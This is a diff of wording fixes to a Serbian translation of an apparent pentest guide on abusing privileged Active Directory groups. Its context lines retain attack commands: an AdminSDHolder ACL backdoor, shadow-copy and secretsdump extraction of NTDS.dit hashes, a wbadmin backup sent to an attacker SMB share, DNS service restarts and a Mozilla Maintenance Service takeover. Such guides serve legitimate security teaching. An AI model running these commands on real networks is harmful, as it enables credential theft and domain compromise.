@@ -20,7 +20,7 @@ Dodavanje novih korisnika je dozvoljeno, kao i lokalna prijava na DC01.
 
 ## AdminSDHolder grupa
 
-Access Control List (ACL) grupe **AdminSDHolder** je ključna jer postavlja dozvole za sve "zaštićene grupe" unutar Active Directory, uključujući grupe sa visokim privilegijama. Ovaj mehanizam osigurava bezbednost ovih grupa sprečavanjem neovlašćenih izmena.
+Access Control List (ACL) grupe **AdminSDHolder** je ključna jer postavlja dozvole za sve "zaštićene grupe" unutar Active Directory-a, uključujući grupe sa visokim privilegijama. Ovaj mehanizam osigurava bezbednost ovih grupa sprečavanjem neovlašćenih izmena.
 
 Napadač bi mogao da iskoristi ovo modifikovanjem ACL-a grupe **AdminSDHolder**, dodeljujući pune dozvole standardnom korisniku. Ovo bi efikasno dalo tom korisniku punu kontrolu nad svim zaštićenim grupama. Ako se dozvole ovog korisnika promene ili uklone, one bi se automatski ponovo uspostavile u roku od sat vremena zbog dizajna sistema.
 
@@ -30,17 +30,17 @@ Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
-Dostupan je skript za ubrzavanje procesa vraćanja: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
+Dostupan je skript za ubrzavanje procesa obnavljanja: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
 
 Za više detalja, posetite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
 
 ## AD Recycle Bin
 
-Članstvo u ovoj grupi omogućava čitanje obrisanih Active Directory objekata, što može otkriti osetljive informacije:
+Članstvo u ovoj grupi omogućava čitanje obrisanih objekata Active Directory-a, što može otkriti osetljive informacije:
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
-### Pristup Domenskom Kontroleru
+### Pristup Kontroleru Domena
 
 Pristup datotekama na DC-u je ograničen osim ako korisnik nije deo grupe `Server Operators`, što menja nivo pristupa.
 
@@ -56,7 +56,7 @@ Ova komanda otkriva da `Server Operators` imaju potpuni pristup, omogućavajući
 
 Članstvo u grupi `Backup Operators` pruža pristup `DC01` fajl sistemu zbog privilegija `SeBackup` i `SeRestore`. Ove privilegije omogućavaju pretragu foldera, listanje i kopiranje fajlova, čak i bez eksplicitnih dozvola, koristeći `FILE_FLAG_BACKUP_SEMANTICS` flag. Korišćenje specifičnih skripti je neophodno za ovaj proces.
 
-Da biste listali članove grupe, izvršite:
+Da biste prikazali članove grupe, izvršite:
 ```powershell
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
@@ -85,7 +85,7 @@ Direktan pristup datotečnom sistemu kontrolera domena omogućava krađu `NTDS.d
 
 #### Using diskshadow.exe
 
-1. Napravite senku kopiju `C` diska:
+1. Kreirajte senku kopiju `C` diska:
 ```cmd
 diskshadow.exe
 set verbose on
@@ -115,9 +115,9 @@ reg save HKLM\SAM SAM.SAV
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
-#### Koristeći wbadmin.exe
+#### Korišćenje wbadmin.exe
 
-1. Postavite NTFS datotečni sistem za SMB server na mašini napadača i keširajte SMB akreditive na cilјnoj mašini.
+1. Postavite NTFS fajl sistem za SMB server na mašini napadača i keširajte SMB akreditive na cilјnoj mašini.
 2. Koristite `wbadmin.exe` za sistemsku rezervnu kopiju i ekstrakciju `NTDS.dit`:
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
@@ -163,7 +163,7 @@ Ponovno pokretanje DNS usluge (što može zahtevati dodatne dozvole) je neophodn
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-Za više detalja o ovom napadu, pogledajte ired.team.
+Za više detalja o ovom napadnom vektoru, pogledajte ired.team.
 
 #### Mimilib.dll
 
@@ -171,7 +171,7 @@ Takođe je moguće koristiti mimilib.dll za izvršavanje komandi, modifikujući 
 
 ### WPAD zapis za MitM
 
-DnsAdmins mogu manipulisati DNS zapisima da bi izveli Man-in-the-Middle (MitM) napade kreiranjem WPAD zapisa nakon onemogućavanja globalne liste blokiranja upita. Alati poput Responder ili Inveigh mogu se koristiti za spoofing i hvatanje mrežnog saobraćaja.
+DnsAdmins mogu manipulisati DNS zapisima da bi izveli napade Man-in-the-Middle (MitM) kreiranjem WPAD zapisa nakon onemogućavanja globalne liste blokiranih upita. Alati poput Responder-a ili Inveigh-a mogu se koristiti za spoofing i hvatanje mrežnog saobraćaja.
 
 ### Čitaoci događaja
 Članovi mogu pristupiti dnevnicima događaja, potencijalno pronalazeći osetljive informacije kao što su lozinke u običnom tekstu ili detalji izvršavanja komandi:
@@ -189,11 +189,11 @@ Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
 ## Hyper-V Administratori
 
-Hyper-V Administratori imaju potpuni pristup Hyper-V, što se može iskoristiti za preuzimanje kontrole nad virtuelizovanim Domen kontrolerima. Ovo uključuje kloniranje aktivnih DC-ova i vađenje NTLM hash-eva iz NTDS.dit datoteke.
+Hyper-V Administratori imaju potpuni pristup Hyper-V, što se može iskoristiti za preuzimanje kontrole nad virtuelizovanim Domen kontrolerima. To uključuje kloniranje aktivnih DC-ova i vađenje NTLM hash-eva iz NTDS.dit datoteke.
 
 ### Primer Iskorišćavanja
 
-Mozilla Maintenance Service u Firefox-u može biti iskorišćen od strane Hyper-V Administratora za izvršavanje komandi kao SYSTEM. Ovo uključuje kreiranje hard linka do zaštićene SYSTEM datoteke i zamenu sa malicioznim izvršnim fajlom:
+Mozilla Maintenance Service u Firefox-u može biti iskorišćen od strane Hyper-V Administratora za izvršavanje komandi kao SYSTEM. To uključuje kreiranje tvrdog linka do zaštićene SYSTEM datoteke i zamenu sa zlonamernim izvršnim fajlom:
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
@@ -217,9 +217,9 @@ Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
 Za detaljnije tehnike eksploatacije vezane za **`SeLoadDriverPrivilege`**, treba konsultovati specifične bezbednosne resurse.
 
-#### Korisnici daljinskog pristupa
+#### Korisnici daljinske radne površine
 
-Članovima ove grupe je odobren pristup računarima putem Protokola daljinskog pristupa (RDP). Da bi se izbrojali ovi članovi, dostupne su PowerShell komande:
+Članovima ove grupe je odobren pristup računarima putem protokola daljinske radne površine (RDP). Da bi se izbrojali ovi članovi, dostupne su PowerShell komande:
 ```powershell
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
